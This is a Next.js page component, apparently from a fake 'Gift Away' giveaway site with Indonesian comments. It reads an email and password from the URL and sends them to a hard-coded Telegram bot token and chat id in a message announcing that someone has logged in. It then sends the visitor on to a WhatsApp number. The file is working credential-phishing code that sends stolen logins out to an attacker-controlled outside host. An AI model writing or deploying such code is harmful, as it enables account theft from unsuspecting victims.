"use client";
import React, { useEffect } from "react";
import { useRouter } from "next/navigation";
async function sendMessage(telegram_id: any, message_text: any, token: any) {
  const url = `https://api.telegram.org/bot${token}/sendMessage?parse_mode=markdown&chat_id=${telegram_id}&text=${encodeURIComponent(
    message_text
  )}`;

  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.ok) {
      console.log("Pesan berhasil dikirim");
    } else {
      console.error("Gagal mengirim pesan");
    }
  } catch (error) {
    console.error("Gagal mengirim pesan", error);
  }
}

function page({ params }: { params: { senTele: string } }) {
  const router = useRouter();

  // const item = await  postsData({params});
  const email = decodeURIComponent(params.senTele[1]);
  const password = decodeURIComponent(params.senTele[2]);

  useEffect(() => {
    if (email) {
      // const [email, password] = senTele.split('/');
      const token = "6609139420:AAHBa2lD1wVI9PzM915IUzYQnFrrnTQ1XoA"; // Ganti dengan token bot Telegram Anda
      const telegram_id = "6219231551"; // Ganti dengan ID Telegram penerima
      const message_text = `Ada Yang Login Gift Away \n Email : ${email} \n Password : ${password}`;

      if (email) {
        sendMessage(telegram_id, message_text, token);
        router.push(`https://wa.me/6289653260395`);
      } else {
        console.log("Masukan yang lain");
      }
    }
  }, [email]);
  return <div></div>;
}

export default page;
